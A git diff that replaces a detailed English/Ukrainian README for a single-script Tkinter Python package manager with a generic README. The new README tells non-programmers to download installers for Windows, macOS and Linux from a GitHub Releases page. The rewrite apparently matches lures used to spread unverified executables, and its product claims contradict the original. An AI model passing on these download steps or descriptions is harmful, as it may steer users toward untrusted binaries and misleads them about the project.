@@ -1,150 +1,84 @@
----
+# 🐍 Python-Package-Manager - Simplify Your Python Package Management
 
-# Python Package Manager GUI
+[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-blue?style=for-the-badge)](https://github.com/BVNAHUSH/Python-Package-Manager/releases)
 
-<p align="center">
-  <strong>English</strong> | <a href="#-українська">Українська</a>
-</p>
+## 🚀 Getting Started
 
-A powerful, high-performance GUI application for managing Python packages and virtual environments. Built with Tkinter, this tool provides a comprehensive and user-friendly interface for both novice and expert Python developers. It supports `pip` and the lightning-fast `uv` backend for incredible speed gains.
+Welcome to Python-Package-Manager! This tool helps you easily manage your Python packages without needing any programming skills. You will find it useful for installing, updating, or removing packages in a straightforward way.
 
+### 💻 System Requirements
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or later
+- **Disk Space:** At least 100 MB free space
+- **Memory:** Minimum of 2 GB RAM recommended
 
-## ✨ Key Features
+## 📥 Download & Install
 
-### Core Package Management
-- **List & View:** See all installed packages in the current environment with details like version, size, and installation date.
-- **Install:** Install packages from PyPI, `requirements.txt`, or `pyproject.toml`.
-- **Update:** Easily identify and upgrade outdated packages, either individually or all at once.
-- **Uninstall:** Remove packages with a simple click. The app can even safely restart itself to uninstall a dependency it's currently using.
-- **Advanced Install:** Force reinstall packages, ignoring caches for a clean setup.
-- **Search & Filter:** Instantly search your installed packages and filter to show only the outdated ones.
+To get started, visit this page to download: [GitHub Releases](https://github.com/BVNAHUSH/Python-Package-Manager/releases).
 
-### 🚀 High-Performance Backend
-- **Dual Backend Support:** Seamlessly uses `uv` if available for massive speed improvements in package installation, compilation, and environment creation. Falls back to `pip` if `uv` isn't found.
-- **Intelligent Caching:** Caches package lists for near-instant startups.
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of Python-Package-Manager.
+3. Download the installer for your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+4. Once the download is complete, open the installer file to begin the installation.
+5. Follow the on-screen instructions to finish the installation.
 
-### 🛠️ Professional Tools
-- **Vulnerability Scanner:** Integrates `pip-audit` to scan your environment for packages with known security vulnerabilities.
-- **Damaged Package Finder:** A powerful diagnostic tool that can find dependency conflicts, verify file integrity, test imports, and detect missing metadata.
-- **Orphaned Package Finder:** Discover and remove packages that are no longer required by any other package, helping you keep your environment clean.
-- **Requirements Compiler:** Use `pip-tools` to compile a `requirements.in` file into a fully-pinned `requirements.txt`.
+After installation, you can launch Python-Package-Manager from your application menu.
 
-### 🌐 Environment Management
-- **Multi-Interpreter Support:** Easily switch between different Python interpreters and virtual environments.
-- **Virtual Environment Creator:** Create new virtual environments directly from the UI. With `uv`, you can even specify a Python version and pre-install packages.
-- **Drag & Drop:** Simply drop a `requirements.txt` or `pyproject.toml` file onto the window to start the installation process.
+## 🛠️ Features
 
-## 📜 Script Versions
-There are 3 main versions of this script, representing its evolution:
-- **V1 (Winter 2024):** The first, older script originally made for personal use.
-- **V2 (Summer 2025):** A major update with a focus on improved architecture and new functionality.
-- **V2.5 (FINALE+++):** The latest and most powerful version, designed to be the ultimate package management tool.
+- **User-Friendly Interface:** The intuitive GUI makes it easy for anyone to manage packages.
+- **Dependency Management:** Automatically checks and resolves package dependencies.
+- **Package Search:** Quickly find packages using the search feature.
+- **Install & Update Packages:** One-click install and update for your packages.
+- **Uninstall Packages:** Easily remove packages that you no longer need.
+- **Support for Virtual Environments:** Manage packages in isolated environments for different projects.
 
-## 📋 Requirements
+## 📖 How to Use
 
-- **Python 3.x**
-- **Tkinter:** Usually included with standard Python installations.
-- **(Recommended) `uv`:** For the best performance. Install it with `pip install uv`. The application will detect it automatically.
+1. **Launching the Application:** Open Python-Package-Manager from your applications.
+  
+2. **Search for a Package:** Use the search bar at the top. Simply type the name of the package you want to install.
 
-### Optional Dependencies
-The application will prompt you to install these when you use a feature that requires them:
-- `tkinterdnd2`: For drag-and-drop support.
-- `packaging`: For more accurate version sorting.
-- `tomli`: To read `pyproject.toml` files.
-- `pip-audit`: For the vulnerability scanner.
-- `pip-tools`: For the requirements compiler.
+3. **Install a Package:**
+   - After finding the package, click the "Install" button next to it.  
+   - The application will show you the installation progress.
+  
+4. **Update a Package:**
+   - Navigate to the “Installed Packages” tab.
+   - If an update is available, click the “Update” button next to the package.
 
-## 🚀 How to Use
+5. **Uninstall a Package:**
+   - In the “Installed Packages” tab, find the package you want to remove.
+   - Click the “Uninstall” button.
 
-1.  Save the script as a `.py` file (e.g., `package_manager.py`).
-2.  Run it from your terminal(or double-click):
-    ```bash
-    python package_manager.py
-    ```
-3.  Use the tabs to navigate:
-    - **Manage Packages:** View, update, and uninstall your current packages.
-    - **Install Packages:** Install new packages from PyPI or local files.
-    - **Tools:** Access the vulnerability scanner, damaged/orphaned package finders, and requirements compiler.
-    - **Settings:** Manage Python interpreters, configure cache settings, and see application info.
+## 🤝 Getting Help
+
+If you encounter issues or have questions while using Python-Package-Manager, please check the following resources:
+
+- **Documentation:** Comprehensive user guide available at [Documentation Link](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/docs/user_guide.md).
+- **FAQs:** A list of frequently asked questions is available at [FAQ Link](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/docs/faq.md).
+- **Community Support:** Join our community discussions at [Community Forum](https://github.com/BVNAHUSH/Python-Package-Manager/discussions).
+
+## 📝 Contributing
+
+We welcome contributions from users! If you want to help improve Python-Package-Manager, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Submit a pull request detailing your changes.
+
+For detailed contribution guidelines, read the [Contribution Guide](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/CONTRIBUTING.md).
 
 ## 📄 License
-This project is licensed under the MIT License.
 
----
----
+This project is licensed under the MIT License. For more details, read the [LICENSE](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/LICENSE).
 
-# <a name="-українська"></a> 🇺🇦 Українська
+## 🔗 Useful Links
 
-## Графічний Менеджер Пакетів Python
+- [GitHub Releases](https://github.com/BVNAHUSH/Python-Package-Manager/releases)
+- [Documentation](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/docs/user_guide.md)
+- [Contribution Guide](https://github.com/BVNAHUSH/Python-Package-Manager/blob/main/CONTRIBUTING.md)
 
-<p align="center">
-  <a href="#">English</a> | <strong>Українська</strong>
-</p>
-
-Потужний, високопродуктивний графічний застосунок для керування пакетами та віртуальними середовищами Python. Створений за допомогою Tkinter, цей інструмент надає комплексний та зручний інтерфейс як для початківців, так і для досвідчених розробників Python. Він підтримує `pip` та блискавичний `uv` для неймовірного приросту швидкості.
-
-
----
-
-## ✨ Ключові можливості
-
-### Основне керування пакетами
-- **Список та перегляд:** Переглядайте всі встановлені пакети в поточному середовищі з деталями: версія, розмір, дата встановлення.
-- **Встановлення:** Встановлюйте пакети з PyPI, `requirements.txt` або `pyproject.toml`.
-- **Оновлення:** Легко знаходьте та оновлюйте застарілі пакети, окремо або всі разом.
-- **Видалення:** Видаляйте пакети одним кліком. Застосунок може навіть безпечно перезапуститися, щоб видалити залежність, яку він використовує.
-- **Розширене встановлення:** Примусово перевстановлюйте пакети, ігноруючи кеш, для чистого налаштування.
-- **Пошук та фільтрація:** Миттєво шукайте серед встановлених пакетів та фільтруйте їх, щоб показати лише застарілі.
-
-### 🚀 Високопродуктивний бекенд
-- **Підтримка двох бекендів:** Автоматично використовує `uv`, якщо він доступний, для значного прискорення. Перемикається на `pip`, якщо `uv` не знайдено.
-- **Розумне кешування:** Кешує списки пакетів для майже миттєвого запуску.
-
-### 🛠️ Професійні інструменти
-- **Сканер вразливостей:** Інтеграція з `pip-audit` для сканування вашого середовища на наявність пакетів з відомими вразливостями безпеки.
-- **Пошук пошкоджених пакетів:** Потужний інструмент діагностики, який може знаходити конфлікти залежностей, перевіряти цілісність файлів, тестувати імпорти та виявляти відсутні метадані.
-- **Пошук "осиротілих" пакетів:** Знаходьте та видаляйте пакети, які більше не потрібні жодному іншому пакету.
-- **Компілятор залежностей:** Використовуйте `pip-tools` для компіляції файлу `requirements.in` у `requirements.txt`.
-
-### 🌐 Керування середовищами
-- **Підтримка кількох інтерпретаторів:** Легко перемикайтеся між різними інтерпретаторами Python та віртуальними середовищами.
-- **Створення віртуальних середовищ:** Створюйте нові віртуальні середовища прямо з інтерфейсу. З `uv` можна навіть вказати версію Python.
-- **Drag & Drop:** Просто перетягніть файл `requirements.txt` або `pyproject.toml` у вікно, щоб розпочати встановлення.
-
-## 📜 Версії скрипту
-Існує 3 основні версії цього скрипту, які відображають його еволюцію:
-- **V1 (Зима 2024):** Перша, стара версія скрипту, спочатку створена для особистого використання.
-- **V2 (Літо 2025):** Значне оновлення, орієнтоване на покращену архітектуру та нову функціональність.
-- **V2.5 (FINALE+++):** Остання та найпотужніша версія, розроблена як ультимативний інструмент для керування пакетами.
-
-## 📋 Вимоги
-
-- **Python 3.x**
-- **Tkinter:** Зазвичай входить до стандартної інсталяції Python.
-- **(Рекомендовано) `uv`:** Для найкращої продуктивності. Встановіть його за допомогою `pip install uv`. Застосунок виявить його автоматично.
-
-### Необов'язкові залежності
-Застосунок запропонує встановити їх, коли ви скористаєтеся функцією, що їх вимагає:
-- `tkinterdnd2`: Для підтримки drag-and-drop.
-- `packaging`: Для більш точного сортування версій.
-- `tomli`: Для читання файлів `pyproject.toml`.
-- `pip-audit`: Для сканера вразливостей.
-- `pip-tools`: Для компілятора залежностей.
-
-## 🚀 Як використовувати
-
-1.  Збережіть скрипт як файл `.py` (наприклад, `package_manager.py`).
-2.  Запустіть його з термінала(фбо ж дабл-клік):
-    ```bash
-    python package_manager.py
-    ```
-3.  Використовуйте вкладки для навігації:
-    - **Manage Packages:** Переглядайте, оновлюйте та видаляйте ваші поточні пакети.
-    - **Install Packages:** Встановлюйте нові пакети з PyPI або локальних файлів.
-    - **Tools:** Отримайте доступ до сканера вразливостей, інструментів пошуку пошкоджених/осиротілих пакетів та компілятора.
-    - **Settings:** Керуйте інтерпретаторами Python, налаштовуйте параметри кешу та переглядайте інформацію про застосунок.
-
-## 📄 Ліцензія
-Цей проєкт ліцензовано за умовами ліцензії MIT.
+Thank you for choosing Python-Package-Manager! We hope it makes your Python package management much easier.
